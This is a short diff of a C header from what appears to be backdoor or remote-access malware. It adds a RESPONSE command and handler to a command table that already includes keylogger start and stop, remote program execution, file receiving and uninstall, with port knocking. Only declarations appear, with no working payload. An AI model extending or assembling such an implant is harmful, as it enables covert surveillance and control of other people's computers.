@@ -9,7 +9,7 @@
 #define PORT_KNOCKING_PORT 30
 #define INITIAL_IP 10
 #define MESSAGE_BUFFER_LENGTH 1024
-
+#define RESPONSE_BUFFER_LENGTH 4096
 struct server_options;
 
 enum command_codes {
@@ -24,6 +24,7 @@ enum command_codes {
     RUN_PROGRAM,
     UNINSTALL,
     DISCONNECT,
+    RESPONSE,
     UNKNOWN
 };
 
@@ -34,6 +35,12 @@ struct packet_data {
 };
 
 struct session_info {
+#ifdef CLIENT_BUILD
+    struct client_options * client_options_;
+#endif
+#ifdef CENTRAL_BUILD
+    struct server_options * server_options_;
+#endif
     struct packet_data * head;
     int command_counter; // The number of times a command was encountered
     enum command_codes last_command_code;
@@ -58,6 +65,7 @@ void start_keylogger(struct session_info * session_info);
 void stop_keylogger(struct session_info * session_info);
 void process_run_command(struct session_info * session_info);
 void process_receive_file(struct session_info * session_info);
+void handle_response(struct session_info * session_info);
 
 //  Map of command codes and handler functions
 static const key_pair command_handler_functions[] = {
@@ -65,6 +73,7 @@ static const key_pair command_handler_functions[] = {
     { STOP_KEYLOGGER, stop_keylogger },
     { RUN_PROGRAM, process_run_command },
     { RECEIVE_FILE, process_receive_file },
+    { RESPONSE, handle_response },
     { 0, NULL }
 };
 
